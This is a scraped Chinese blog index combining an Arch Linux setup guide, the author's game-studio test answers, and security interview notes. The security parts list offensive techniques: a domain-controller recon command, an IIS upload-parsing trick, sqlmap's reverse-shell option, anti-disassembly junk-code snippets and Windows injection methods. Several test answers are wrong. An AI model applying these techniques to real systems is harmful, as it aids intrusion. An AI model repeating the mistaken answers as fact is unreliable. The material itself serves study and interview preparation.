sshd.service\n设置自动连接网络（有线）systemctl enable dhcpcdsystemctl start  dhcpcd.service\n\n安装GRUB# 安装基本包mkdir -p /boot/efi/EFI/bootpacman -S grub-efi-x86_64 efibootmgr os-prober# 安装grub到磁盘上grub-install --efi-directory=/boot/efi --bootloader-id=grubcp /boot/efi/EFI/grub/grubx64.efi /boot/efi/EFI/boot/bootx64.efigrub-mkconfig -o /boot/grub/grub.cfg\numount分区并重启机器exitumount /mnt/boot/efi &amp;&amp; umount /mnt &amp;&amp; reboot\n\n\n\n\n\n安装图形界面开机后启动网络服务systemctl enable NetworkManager.service systemctl start NetworkManager.service \n\n启动wpa_supplicant服务sudo systemctl enable wpa_supplicant.servicesudo systemctl start wpa_supplicant.service# 查看 wifi 列表：nmcli dev wifi list# 连接wifinmcli device wifi connect [wifi name] password [wifi password]\n\n安装基本网络命令包pacman -S net-tools dnsutils inetutils iproute2\n\n若网络按安装比较慢，尝试更换源\nvim /etc/pacman.d/mirrorlist# 增加以下内容## ChinaServer = http://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch## ChinaServer = http://mirror.lzu.edu.cn/archlinux/$repo/os/$arch## ChinaServer = http://mirrors.cqu.edu.cn/archlinux/$repo/os/$arch\n\n安装显卡驱动安装软件包 mesa，它提供 DRI 和 3D 加速若需要x86_64下的32位支持,可以从 multilib 安装 lib32-mesa.要使用 Xorg 2D 加速 DDX 驱动，请安装软件包 xf86-video-ati.加速视频解码 由 mesa-vdpau 和 lib32-mesa-vdpau 包提供支持\n硬件接口服务参考 xorg-server\npacman -S xorg-server \n安装驱动pacman -S xf86-video-intelpacman -S nvidia nvidia-utils nvidia-dkms nvidia-lts nvidia-prime nvidia-settingspacman -S community/nccl#xf86-video-intel intel显卡驱动#xf86-video-ati  AMD显卡驱动\n\n声卡驱动pacman -S alsa-utils pulseaudio pulseaudio-alsa\n\n安装输入设备pacman -S xf86-input-libinput // (xorg-server已经默认安装)\n安装触摸板驱动pacman -S xf86-input-synaptics\n\n\n安装显示管理器pacman -S sddm sddm-kcmsystemctl enable sddm\n\n\n安装plasma桌面pacman -S plasma-desktop \n\n安装基本的软件pacman -S dolphin konsole kwrite plasma-pa kscreen\n\n安装中文字体pacman -S ttf-dejavu ttf-liberation wqy-microhei\n\n安装ntfs磁盘的支持pacman -S ntfs-3g\n\n安装中文输入法可跳过，后续安装更好的输入，搜狗输入法。\n# pacman -S fcitx fcitx-rime fcitx-im kcm-fcitx fcitx-googlepinyin\n\n安装plasma网络工具托盘pacman -S plasma-nm# 系统托盘网络管理工具\n\n安装plasma音量管理托盘pacman -S plasma-pa\n\n设置pacman彩色输出打开&#x2F;etc&#x2F;pacman.conf文件找到被注释的#Color改为Color,pacman就会输出彩色信息方便查看\n安装主题pacman -S arc-kde\n\n首次用户目录生成安装 xdg-user-dirs\npacman -S xdg-user-dirs #跟新用户目录xdg-user-dirs-update # 若不慎删除了某个默认用户文件夹，使用如下命令强制重新生成家目录文件夹# xdg-user-dirs-update --force# 该命令只对当前用户起作用\n\n\n安装图标pacman -S papirus-icon-theme\n\n添加用户务必添加一个 用户 ，否则后面sddm显示管理器登录的时候无法登录，sddm不会列出root用户\n# 添加i0gan用户，i0gan可替换为你自己的账户。useradd -m -g users -s /bin/bash i0gan # 为刚才添加的用户设置密码passwd i0gan vim /etc/sudoers# 在 root ALL=(ALL) ALL 下面添加# i0gan ALL=(ALL) ALL# 为你刚才创建的用户 添加sudo权限\n\n调节亮度查看亮度最大值:\n#只能rootcat /sys/class/backlight/intel_backlight/max_brightnessecho 100 &gt; /sys/class/backlight/intel_backlight/brightness\n我写了个脚本，可以调节亮度：\n#! /bin/bash# 判断是否为rootif [ $UID -ne 0 ];then\techo &#x27;Please run as root first.&#x27;\texitfimax=`cat /sys/class/backlight/intel_backlight/max_brightness`echo &quot;The max brightness: $max&quot;# input valueread -p &quot;Your brightness:&quot; valuemin_value=20if [ $value -le $min_value ];then\tvalue=$min_value\techo &#x27;aa&#x27;fiecho $value &gt; /sys/class/backlight/intel_backlight/brightnessecho &#x27;finish&#x27;\n\n\n\n终端显示电量pacman -S acpi\n\n\n再重启以下即可进入图形话界面了。\n双显卡问题这里针对的是Y7000以及Y9000双显卡问题，但显卡可直接跳过。\n方法1关闭独立显卡，使用集成显卡\nref: https://blog.csdn.net/weixin_30418225/article/details/113891206\npacman -S bbswitch\n\n安装好之后需要修改一些地方首先，在&#x2F;etc&#x2F;modules-load.d下新建bbswitch.conf，并修改为如下内容。这样每次启动都会加载bbswitch模块了\n[系统关闭独立显卡及省电降温设置]bbswitch\n\n然后，在&#x2F;etc&#x2F;modprobe.d&#x2F;下新建bbswitch.conf，并修改为如下内容。这是bbswitch加载的参数，我们让其默认关闭\noptions bbswitch load_state=0\n\n其次，在&#x2F;etc&#x2F;modprobe.d&#x2F;下新建nouveau_blacklist.conf，并修改为如下内容。有时候bbswitch加载了，但是不能关闭显卡，因为有些模块正在占用着，因此要禁掉。\nblacklist nouveaublacklist nvidiafb\n\n最后，在&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system-shutdown&#x2F;下新建nvidia_card_enable.sh，并修改为以下内容，记得加运行权限。每次reboot的时候，显卡都是关闭的，不管是重启到windows还是linux，都会找不到设备，必须彻底关机才行。解决该问题的办法就是每次重启都启用显卡\n#!/bin/bashcase &quot;$1&quot; inreboot)echo &quot;Enabling NVIDIA GPU&quot;echo ON &gt; /proc/acpi/bbswitch;;*)esac\n\n\n\n方法2增加额外源，若还是出现闪屏失败，可尝试下面的方法,采用\n增加archlinuxcn源\n打开/etc/pacman.conf，在末尾加上[archlinuxcn]SigLevel = Optional TrustAllServer = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/$arch#安装key-ringsudo pacman -Sysudo pacman -S archlinuxcn-keyring\n\n安装yay yaourt bumblebee，这里的i0gan是我的用户名称。\npacman -S yay yaourtpacman -S bumblebee mesagpasswd -a i0gan bumblebeesystemctl enable bumblebeed.servicesystemctl start bumblebeed.servicepacman -S archlinuxcn/optimus-manager # 安装显卡管理软件\n\n参考 \nInstalling Bumblebee with Intel&#x2F;NVIDIA\nArchlinux双显卡安装NVIDIA闭源驱动\n方法3还是闪屏采用一下方法试试。\n\n\n确保能正常进入桌面，安装必要的软件包\n\n$ sudo pacman -S bumblebee bbswitch\n\n\n把i0gan添加到bumblebee组里\n\n$ sudo gpasswd -a i0gan bumblebee\n\n\n启动bumblebeed服务\n\nsudo systemctl enable bumblebeed.service\n\n\n安装依赖\n\n$ sudo pacman -S bumblebee nvidia opencl-nvidia lib32-nvidia-utils lib32-opencl-nvidia mesa lib32-mesa-libgl xf86-video-intel\n\nlib32打头的需要开启multilib，把/etc/pacman.conf文件中的下面两行取消注释，然后执行pacman -Sy\n#[multilib]#Include = /etc/pacman.d/mirrorlist\n\n\n配置bumblebee\n\nsudo nano /etc/bumblebee/bumblebee.conf指定nvidiaDriver=nvidia电源管理指定bbswitch[driver-nvidia]PMMethod=bbswitch\n\n弄好之后重启\n检测是否安装成功\n安装测试软件\n\n$ sudo pacman -S virtualgl\n\n\n运行测试软件\n\n$ optirun glxspheres64\n\n开启和关闭NVIDIA显卡\n\n查看状态使用nvidia-smi命令可以查看NVIDIA显卡是否已经启动\n开启\n\n$ sudo tee /proc/acpi/bbswitch &lt;&lt;&lt; ON\n\n\n关闭\n\n$ sudo tee /proc/acpi/bbswitch &lt;&lt;&lt; OFF\n\n\n\n\n\n启用独立显卡切换通过以上方法禁用掉独立显卡后，很多应用程序也会受到影响，比如wine，那么就有必要启动独立显卡，让我们自己通过简单的命令进行动态切换显卡。\n查看启用的显卡状态\noptimus-manager --status \n\n让bumblebee设备查找到 nivida显卡\nref: https://askubuntu.com/questions/290443/bumblebee-cannot-access-secondary-gpu-error-xorg-ee-no-devices-detected\nThe following AskUbuntu answer fixed it for me: https://askubuntu.com/a/285638/47280\nBasically, you need to edit /etc/bumblebee/xorg.conf.nvidia and uncomment the following line:\nBusID &quot;PCI:01:00:0&quot;\n\n让xorg启用 nivida显卡\nref: https://archived.forum.manjaro.org/t/guide-install-and-configure-optimus-manager-for-hybrid-gpu-setups-intel-nvidia/92196\nvim &#x2F;etc&#x2F;X11&#x2F;xorg.conf.d&#x2F;10-optimus-manager.conf\nSection &quot;Device&quot;        Identifier &quot;integrated&quot;        Driver &quot;modesetting&quot;        BusID &quot;PCI:0:2:0&quot;        Option &quot;DRI&quot; &quot;3&quot;EndSection\n\n删除掉以上信息\noptimus-manager --status optimus-manager --switch nvidia # 切换到独立显卡。\n\nhttps://github.com/Askannz/optimus-manager\n\nBumblebee : optimus-manager is incompatible with Bumblebee since both tools would be trying to control GPU power switching at the same time. If Bumblebee is installed, you must disable its daemon (sudo systemctl disable bumblebeed.service, then reboot). This is particularly important for Manjaro users since Bumblebee is installed by default.\n\n","categories":["env"],"tags":["linux"]},{"title":"2022 TDS游戏工作室笔试","url":"/2022/03/08/dev/game/interview/TDS%E5%B7%A5%E4%BD%9C%E5%AE%A4%E7%AC%94%E8%AF%95/","content":"2022 TDS游戏工作室笔试以下是我在2022 TDS游戏工作室的填写的笔试内容，由于个人某些原因没去参加面试。\n1 请简述缓存机制在计算机中的应用。\n比如CPU寄存器与内存之间的数据传输,寄存器与内存的传输速率都有着较大的差距,为了避免在处理数据时,cpu等待内存传输过来的时间,在寄存器与内存之间加了缓存器,采用缓存方式来降低等待数据的时间.把最常用的数据放在缓存里,CPU读取缓存里的数据就可以了.\n游戏里也会有,游戏再加载场景的时候,会将场景资源数据读到内存的缓存里中,需要的资源的时候直接从缓存中读取就可以,无需再从磁盘中读取,提高了访问速度.\n在服务端开发的时候,接收一个文件时,并不是收到数据就将其数据写入到文件里,若在网络比较差的情况,会造成多次使用文件IO写入数据到磁盘,对其开销比较大,为了降低CPU开销,开辟一定范围的内存来对文件数据进行缓存,达到一定数量再将其写入到文件中.在服务端开发中,类似的还有日志系统,打日志的时候并不是实时的,采用缓存方式降低开销.在c语言中printf,scanf,fprintf,fscanf,puts函数里都有相关缓存,里面有FILE结构体,该结构体中就包含了文件IO的缓冲区,目的是为了降低CPU开销.\n在TCP底层协议中也包含了缓存机制,比如滑动窗口移动依赖于数据的缓存,为了让数据超时时重发,丢包时重发,一次能够发送较大的数据包.\n\n总结: 1. 提高访问速度, 2. 降低CPU消耗  3. 安全验证\n2 请简述UDP和TCP的差别。\n包头长度差别, 基于IPV4&#x2F;IPV6上的 UDP包头首部长占8字节, TCP包头首部长占20字节\ntcp需要建立连接之后才能发送数据,udp不需要建立连接即可直接发送数据.\n可靠性差别,tcp是一种可靠协议,建立连接后断开连接前传输数据丢包率几乎为0, udp是一种不可靠协议,可能会出现丢包现象.\n速度差别, 由于udp包头相对比tcp短,且udp不需要建立连接,且有很多的验证机制udp没有,udp的传输速度相对较快.\nUDP可在局域网实现广播功能(相当于又充当服务端,有充当客户端), TCP只能采用服务中转才能实现广播.\nUDP可以实现打洞功能,TCP不能. 打洞技术在IM技术中尤为常见, 比如QQ的离线文件发送,传输的数据是不需要经过服务端中转的.\n\n3 系统页面文件系统页面文件也就是虚拟内存所缓存数据的文件,当物理内存容量不够用时,可以创建一个虚拟内存来增大内存容量,来实现装载更大的程序,唯一的缺点就是,装载程序置虚拟内存中时比较慢。\n4 系统页面向对象面向对象(OOP)是一种编程思想,把我们要实现的东西想看作为对象,该对象又可以由多个对象组成.构建对象的特性一般有封装,继承,多态.该对象可以开放功能(该对象的用途) [封装],可以基于之前的对象迭代增加新功能创建出新对象[继承] 且可以修改之前有的部分功能[多态]. \n比如生产一辆汽车,我们可以将汽车看做一个大的对象,而我在生产汽车前我们需要完成生产方案.若有个汽车制造工厂参考了我们的汽车生产方案,制作出适合他们工厂新的方案 这个过程叫做继承.方案中所涉及的一些配件,只需说明是什么规格的配件, 配件上的技术不公布,只告诉你是什么,怎么用,这种情况可以称做封装.汽车制造商参考了我们的生产方案,且对我们原来生产方案中做了某些方案覆盖实现修改,可以覆盖原来的部分方案性质叫做多态.\n5 系统页请简述C#中可空类型的使用方法与存在意义。简单使用方法:    Nullable i &#x3D; new Nullable(0); &#x2F;&#x2F; 声明一个可空int类型的变量i, 且赋初始值为0    int? i2; &#x2F;&#x2F; 声明一个可空int类型的变量空变量i2,初始值为null\n存在的意义:    1. 可以定义一个未被赋值的变量    2. 可以判断值类型对象是否被赋值.\n6 系统页请简述C#中流的操作要点。流用于对IO处理的一种缓存机制,也是对IO操作细节的一个封装, 如文件操作,网络通信,内部通信,IO设备通信等.一般来说,流的操作流读取:操作是从流到数据结构的传输流写入:该操作时从数据结构到流的传输流查找修改:对流内的当前位置进行查询与修改流一般有内存流 MemoryStream,缓冲流BufferedStream,网络流 NetWorkStream, 文件流 FileStream,文本流 StreamWriter,字符串流 StringWriter等,其用法都是基本类似的.\n7 系统页列举至少三种排序方法，并简述每种方法的实现逻辑。有冒泡, 选择, 插入, 归并排序, 快速排序,还有其他的等等.\n冒泡排序:    若长度为n的数组,从左往右两两比较,若左边大于(小于)右边,则进行交换,这为一轮,多进行n - 2次轮即可完成排序.\n选择排序:    1. 将数组分成已排序区与待排序区        2. 在待排序区域找最大值或最小值放在已排序区.        3. 依次进行2步骤即可完成排序.\n插入排序:    1. 将数组分成已排序区与待排序区        2. 从待排序区取下第一个数与已排序区从后依次数比较(若没有数直接放),找到合适的位置放入,(放入时需要进行数据移动).        3. 多次进行2,即可实现排序.\n归并排序:    把长度为n的输入序列分成两个长度为n&#x2F;2的子序列；    对这两个子序列分别采用归并排序；    将两个排序好的子序列合并成一个最终的排序序列。\n快速排序:    首先设定一个分界值，通过该分界值将数组分成左右两部分    将大于或等于分界值的数据集中到数组右边，小于分界值的数据集中到数组的左边。此时，左边部分中各元素都小于分界值，而右边部分中各元素都大于或等于分界值    然后，左边和右边的数据可以独立排序。对于左侧的数组数据，又可以取一个分界值，将该部分数据分成左右两部分，同样在左边放置较小值，右边放置较大值。右侧的数组数据也可以做类似处理    重复上述过程，通过递归将左侧部分排好序后，再递归排好右侧部分的顺序。当左、右两个部分各数据排序完成后，整个数组的排序也就完成了\n8 系统页依据特点比较栈和队列。举例说明它们各自的实践运用。​        栈结构是先进后出,队列是先进先出.​        堆栈运用​        1. 比如在计算机中,函数的调用约定,局部变量的储存这些都是采用堆栈结构储存的.函数的汇编指令 call和ret, call A 等价于 push 下一条指令地址 (将下一条指令地址压入), jmp到目标地址A,ret 相当于 pop eip(将栈顶数据弹出来).\n    2. 函数的递归调用也可以采用堆栈数据结构来实现.\n    \n    队列运用\n    1. 队列的话在服务端开发比较常用,比如消息系统可以采用队列来实现,这样不会影响到消息数据的先后顺序.\n    2. 请求缓冲区, 有时候在后台中,数据库可能需要查询很久,若服务器是异步的,我们可以将请求放在队列中进行等待.\n\n​    \n9 对于会出现大量的、重复的、短暂的使用某一种对象的操作，我们通常使用哪一种设计模式来减少该对象在主循环生成时所带来的开销？​    单例模式\n10 假设你需要让游戏支持成就系统，但同时不希望成就计算内嵌在游戏主代码之中，你会采用哪一种设计模式来实现此功能？工厂模式\n11 请简述模型和贴图的本质。模型是采用3d建模软件构建的,是虚拟物体形体的表现.贴图是基于模型之上表达更丰富的元素,比如模型的颜色,阴影.\n12 必填请详述FixedUpdate、Update与LateUpdate之间的区别和Time.deltaTime与Time.fixedDeltaTime的区别。FixedUpdate是以恒定帧率调用的,以恒定的时间间隔进行调用    Update是每一帧调用一次,会受到对象渲染的影响,可能时间间隔会发送变化.    LateUpdate是调用完Update之后再去调用LateUpdate\n13 Unity中，GameObject、Transform和MonoBehaviour之间的关系是什么？GameObject是Unity最基本的对象, Transform是GameObject的一个基本组件,但又是Transform的一个特殊组件,该组建包含了父子对象的与子对象的层级结构    MonoBehaviour是Unity中脚本的基类,脚本是GameObject上的一个组件,当一个GameObject挂上脚本之后,创建该对象,就会触发该脚本运行.脚本会先调用重写MonoBehaviour中的    Awake函数, 在实例化所有GameObject组件后,再去播放游戏帧,才会调用脚本中的Start等等一系列其他函数.\n14 请简述Unity中Gizmos的使用方法。Gizmos是用于场景可视化调试用的,在Unity Sence面板右上方有Gizmos一个图标,可以打开或关闭,比如打开时,可以看到灯光,摄像机,用于方便我们确定位置,关闭时就看不到了.    Gizmos还提供了一些列可操作函数,更改默认的一些显示属性.\n在继承于MonoBehaviour类中,重写OnDrawGizmos与OnDrawGizmosSelected即可\nOnDrawGizmos是不运行游戏都会自动不断调用\nOnDrawGizmosSelected只有选择该对象后才能调用该函数.\nGizmos提供了一些API函数如下\nGizmos.DrawRay //绘制射线\nGizmos.DrawCube // 绘制方体\n还有其他等等一系列函数可以用,根据gizmos提供的绘制函数,将代码放在OnDrawGizmos或OnDrawGizmosSelected就可以了\n\n15 请简述ScriptableObject在游戏制作中可能的应用。让游戏永久性的保存数据,将数据储存在资源文件中    1. 有时候为了我们开发人员的一个开发,有一些游戏数据是需要保存的,但我们定义的一些全局变量来储存游戏数据,游戏重新运行数据就没有了,为了保存游戏数据,我们可以通过        ScriptableObject来储存        2. 场景数据对象,在场景进行切换时,我们可以通过该对象很方便的实现数据共享,每个场景都可以更改或查看数据.\n16 一些游戏（参考：《 Super Hot 》、《猎天使魔女》、《GTA5》）中“子弹时间”的存在意义是什么？谈谈你如何用程序实现，并怎样优化其效果和提高玩家体验。​    让玩家体验另一种感觉，时间变缓慢，能够突出动作的精彩部分，带来震撼视觉效果。​    可通过调整TimeScale和Time.fixedDeltaTime的值来实现速度变慢的效果。​    不同设备可能有着不同的性能，如果性能好，帧率比较高，可以通过MaximumParticleTimestep来限制播放的速率。如果性能比较拉胯，可以调整​    MaximumAllowedTimestep来限制最大时间间隔，FixedUpdate函数每帧时间不会超过该值，保证程序正常模拟物理效果。​    \nvoid Update()\n&#123;\n    if (Input.GetButtonDown(&quot;Fire1&quot;))\n    &#123;\n        if (Time.timeScale == 1.0f)\n            Time.timeScale = 0.7f;\n        else\n            Time.timeScale = 1.0f;\n        Time.fixedDeltaTime = this.fixedDeltaTime * Time.timeScale;\n    &#125;\n&#125;\nhttps://docs.unity3d.com/Manual/class-TimeManager.html\n\n17 如果你要使用Unity引擎制作一款卡牌游戏（参考：《炉石传说》、《杀戮尖塔》），请简述一下你的实现思路。简单策划如下：    首先先定义英雄属性,职业,生命,护甲和技能, 物理攻击力,魔法攻击力,防御力。    定义一共通用的关卡模板，使用同一个场景。    每一关只是挑战的英雄不同，还有剧情不同，通过数据来实现控制每一关的不同。    定义不同的关卡数据，剧情数据。    在关卡中战斗中，按照先后顺序进行攻击，玩家根据自己选择英雄的技能进行攻击，自己的英雄死亡失败，敌方的英雄死亡胜利。\n服务端大致思路：\n    游戏数据储存在后台，需要有服务端，卡牌类游戏实时性不是那么强，那么可以采用tcp协议加一个epoll非阻塞反应堆来架构游戏后台。\n    为了游戏的安全性，游戏数据传输需要进行私有协议加密，让游戏数据方便管理，还需要单独开发管理后台。\n    数据储存的话就采用mysql，缓存可以采用redis或者mongoDB。需要单独开发，网关服务器，登录服务，主服务器，cdn服务器，房间服务器。\n\n    网关服务器，主要负责处理客户端获取各个服务器ip地址的请求，发送配置文件的服务器。\n    cdn服务器负责热更新资源下载，架设个nginx即可。\n    登录服务器，主要是账号登录，分发服务器通用授权的cookie，可采用单点登录实现思路。\n    房间服务器，每一关战斗处理的服务器，负责按照游戏规则实现机器人与玩家战斗数据同步与作弊监测。按照给定的游戏规则，与玩家进行战斗模拟，且战斗涉及的变量值会在该服务器里完成计算，并且设定战斗结束条件。\n    主服务器，与各各服务器之间数据库之间相联系。储存游戏规则，英雄，玩家，关卡数据等，还负责处理玩家交互请求，后台管理请求等。\n    \n客户端大致思路：\n    进入游戏时，访问网关服务器，获取各个服务器的ip地址。\n    校验当前版本与cdn服务器中资源版本是否对应，若当前版本比较旧，就从cdn服务器下载资源更新版本。\n    账号登录，登录后获得授权cookie值，后期与服务器交互需要加上该值。\n    从服务端获取各个英雄的属性，还有关卡信息，玩家数据，将其数据通过指定的样式渲染出来。\n    进入战斗房间，向服务端申请房间服务器，服务端回馈ip地址，后期战斗就通过该服务器进行数据传输。\n    玩家每点击一个技能，都会向房间服务器发送释放技能请求，战斗血量值加减在服务端实现，客户端只对数据进行渲染成画面。\n    处理游戏战斗结束画面，对服务端返回的得分或者经验值进行增加渲染。\n\n​        \n18 一个游戏通常应该由哪些职位合作完成？简述各个职位（重点是程序）的作用。​    \n策划员，美工，程序员，管理员。​    策划员：负责对游戏内容（数值，剧情，文案，运营）进行策划。​    美工：按照策划员的策划进行模或者制作出游戏UI。​    程序员：根据策划员提供的策划与美工提供的游戏素材采用编程创造出相应的游戏软件，其中测试员，运维人员，都可以包含在其中。​    管理员：负责考勤，管理各个职位的配合，还有法律相关问题。\n19 游戏开发中的程序大概可分为哪些方面？描述一下你未来想要从事方面的具体工作。业务型和研究型吧。    业务型，会使用常规引擎根据业务需求开发出满足需求的游戏，一般是使用现成的库来实现相应的需求。    研究型，对游戏引擎进行深入研究，研发相关实用的引擎插件，或者研发出属于自己公司内部的引擎，对游戏物理进行研究，模拟出更好的物理效果，还有人工智能寻路，自动战斗。画面优化，性能优化等等。\n​    \n","categories":["dev"],"tags":["interview"]},{"title":"牛客安全服务题目","url":"/2022/03/05/security/nowcoder/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1%E9%A2%98%E7%9B%AE/","content":"牛客安全服务题目2022-3-51 获取域内成员服务器权限后，查看域控制器的命令行是？ \nnet group &quot;domain Controllers&quot; /domain\n\n\n\n2 构造shell.asp;.gif这样的文件名去上传非法文件，利用的是哪个IIS版本的解析漏洞？\nIIS 5.0\n\n\n\n3 mysql默认数据库账号密码为\nroot/root\n\n\n\n4 规避CSRF的方法的是\n使用服务端代码做最终验证判断HTTP referer使用隐藏的token hash做校验\n\n\n\n5 SQLMAP使用下列那个命令可以反弹shell\n--os-pwn\n\n\n\n6 ssrf漏洞用来探测服务器内网端口的协议是什么？\nftp\n\n\n\n7 关于struts2-045漏洞（CVE-2017-5638）说法正确的是\n建议用户升级到不受影响的版本（Struts 2.3.32或Struts 2.5.10.1）或者使用其他Multipart parser应用\n\n\n\n8 ARP欺骗是针对以太网地址解析协议（ARP）的一种攻击技术，其实质是\n提供虚拟的MAC与IP地址的组合\n\n\n\n9 目前我国颁布实施的信息安全相关标准中，哪些标准属于强制执行的标准\nGB 17859-1999 计算机信息系统安全保护等级划分准则\n\n\n\n10 路由信息中包含的是\n目标网络下一跳路由权值\n\n不包含 源地址\n11 VPN系统中的三种典型技术\n隧道技术身份认证技术加密技术\n\n\n\n12 某公司下设6个的子公司，最大的一个子公司有 26台计算机，现申请到一个C类IP地址，子网掩码设为（ ）可使每个子公司在一个网段中\n子网掩码是一个32位地址，用于屏蔽IP地址的一部分以区别网络标识和主机标识，并说明该IP地址是在局域网上，还是在广域网上。子网掩码的设定必须遵循一定的规则。与二进制IP地址相同，子网掩码由1和0组成，且1和0分别连续。子网掩码的长度也是32位，左边是网络位，用二进制数字“1”表示，1的数目等于网络位的长度；右边是主机位，用二进制数字“0”表示，0的数目等于主机位的长度。这样做的目的是为了让掩码与IP地址做按位与运算时用0遮住原主机数，而不改变原网络段数字，而且很容易通过0的位数确定子网的主机数（2的主机位数次方-2，因为主机号全为1时表示该网络广播地址，全为0时表示该网络的网络号，这是两个特殊地址）。通过子网掩码，才能表明一台主机所在的子网与其他子网的关系，使网络正常工作。类别\t子网掩码的二进制数值\t子网掩码的十进制数值A\t11111111 00000000 00000000 00000000\t255.0.0.0B\t11111111 11111111 00000000 00000000\t255.255.0.0C\t11111111 11111111 11111111 00000000\t255.255.255.0计算方式由于子网掩码的位数决定于可能的子网数目和每个子网的主机数目。在定义子网掩码前，必须弄清楚本来使用的子网数和主机数目。该题是对C类地址进行划分6个子网，每个子网中最多包含了26台主机。我们根据子网数来划分： ip结构 = 网络号 + 子网号 + 主机号6个子网，6的二进制是110，子网数占用了3个bit位，我们得需要用1来补全。在子网掩码中，网络号为 111那么还剩5bit，5bit的最大值为 11111 = 32，32-2 = 30，减2的原因是（主机号全为1时表示该网络广播地址，全为0时表示该网络的网络号）。30 &gt; 26，说明可以用该子网掩码。则该子网掩码为  11111111 11111111 11111111 00000000 &amp; 11100000 = 11111111 11111111 11111111 11100000 = 255.255.255.224\n\n\n\n13 Windows提供的分布式安全环境叫做\n域\n\n\n\n\n\n14 linux下查找www目录中名称为shell.php的文件，命令为？\nfind /www -name‘shell.php’\n\n\n\n15 在bash中，在命令后添加2&gt;&amp;1，有何含义？\n标准错误输出重定向到标准输出\n\n\n\n16 DNS欺骗是发生在TCP&#x2F;IP协议中那一层的问题？\n应用层\n\n\n\n17 SSRF是服务器端请求伪造，由服务器发起\n对\n18 启动数据库的账号一般是高权限账号，使用数据库执行系统命令即相当于使用高权限账号执行系统命令，因此数据库提权也属于权限继承类提权。\n对\n19 sql注入按照注入点类型来分类\n数字型字符型搜索型\n\n\n\n20 以下关于chkrootkit工具说法正确的是？\n检测是否被植入后门、木马、rootkit检测登录日志检测系统命令是否正常\n\n\n\n21 以下哪些项属于应用层防火墙的特点？\n更有效的阻止应用层攻击工作在OSI模型的第七层比较容易进行审计\n\n\n\n22 PHP中可能导致XXE漏洞的方法有\nSimpleXMLElement()DOMDocument()\n\n\n\n23 是路由协议的有\nIS-ISOSPFRIP\n\n\n\n24 请写出TCP&#x2F;IP协议的4层概念模型\n应用层，传输层，网络层，数据链路层。\n25 数据结构逆向的重点在于分析什么？\n重点分析数据，数据的引用、数据的变化，从而推理数据的结构\n","categories":["security"],"tags":["interview"]},{"title":"二进制安全面经","url":"/2021/10/24/security/interview/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8%E9%9D%A2%E7%BB%8F/","content":"二进制安全面经自己的面试经历\n2021年1月腾讯科恩实习：一面挂\n2021年12月深信服实习：已过，自己未去实习。\n2022年10绿盟科技校招：应该一面挂\n逆向常见的壳子：\n一、压缩壳： 1、UPX 2、ASPack 3、PECompact 4、RLPack 5、NSPack\n二、保护壳: 1、ASProtect 2、Armadillo 3、EXECryptor 4、Themida 5、VMProtect\n三、捆绑壳： MOleBox\n花指令花指令：目的是干扰ida和od等软件对程序的静态分析。使这些软件无法正常反汇编出原始代码。\n常用的两类反汇编算法：1.线性扫描算法：逐行反汇编（无法将数据和内容进行区分）2.递归行进算法：按照代码可能的执行顺序进行反汇编程序。\n比如：\n//这部分为花指令部分\t__asm&#123;_emit 0xe8&#125;//花指令结束\n\njmp垃圾填充\n__asm&#123;    jmp label1    db junkcodelabel1:    &#125;\n\n多层jmp垃圾填充\n永真条件跳转\n利用jz和jnz的互补条件跳转指令来代替jmp\n_asm&#123;    jz label1    jnz label1    db junkcodelabel1:    &#125;\n\ncall&amp;ret构造花指令\ncall指令：将下一条指令地址压入栈，再跳转执行 ret指令：将保存的地址取出，跳转执行\n清除花指令手动清除：\n手动通过ida打nop去除花指令\n自动自动化花指令：\n通过脚本进行查找特定的opcode，然后替换，一般对对jnx和jx的花指令进行自动化处理\n70 &lt;–&gt; JO(O标志位为1跳转)71 &lt;–&gt; JNO72 &lt;–&gt; JB/JNAE/JC73 &lt;–&gt; JNB/JAE/JNC74 &lt;–&gt; JZ/JE75 &lt;–&gt; JNZ/JNE76 &lt;–&gt; JBE/JNA77 &lt;–&gt; JNBE/JA78 &lt;–&gt; JS79 &lt;–&gt; JNS7A &lt;–&gt; JP/JPE7B &lt;–&gt; JNP/JPO7C &lt;–&gt; JL/JNGE7D &lt;–&gt; JNL/JGE7E &lt;–&gt; JLE/JNG7F &lt;–&gt; JNLE/JG\n\nref: https://blog.csdn.net/abel_big_xu/article/details/117927674\nWindows注入有哪几种方式？ SetwindowsHook\n以调试方式打开进程，制造异常，在接管异常代理的代码里加入注入代码\nCreateRemoteThread  和 Loadlibrary 将要执行的代码写在Dll里\nCreateRemoteThread 和Writeprocessmemory  写汇编代码\n修改PE文件导入表，添加Dll\n修改PE文件入口，将入口指向要执行的代码处，执行完代码再执行正常代码 \n用哪些逆向工具？\nolldbg、ida、windbg等。\nAndoird安卓一般逆向java还有armv8的c++动态链接库，常见\n所使用的逆向工具：\nandroid killer、apktool、ida等。\nVMP 加壳示例\n推荐一个 VMP 加壳程序 ADVMP ;\n\n源码地址 : https://gitee.com/simon_haha/ADVMP\n源码简介 : https://www.cnblogs.com/develop/p/4397397.html\n\nVMP 的核心原理是 自定义 Dalvik 和 ART 解释器 , 解释器解释 Smali 指令流 ; 该解释器是 VMP 加壳的核心原理 ;\n解释器可以使用 Java 实现 , 也可以使用 C 实现 , 使用 Java 实现更容易被破解 ; 因此 , 解释器一般使用 C 实现 , 为了保护解释器不被快速定位 , 一般会使用 OLLVM 技术对解释器进行保护 , 增加逆向的难度 ;\nDex2C 加壳示例\n推荐一个 Dex2C 加壳程序 dcc ;\n\n源码地址 : https://gitee.com/coolblood/dcc\n\nDex2C 加壳特征 : 获取到 DEX 文件后 , 其中被保护的函数 , 由 Java 函数变为了 Native 函数 ;\n传统的编译原理 : 将代码进行词法 , 句法分析 , 生成二进制汇编代码 , 也就是机器码 ;\nDex2C 中, 将 Java 代码进行词法 , 句法分析 , 生成对应的 C &#x2F; C++ 文件 , 然后交叉编译为 SO 动态库 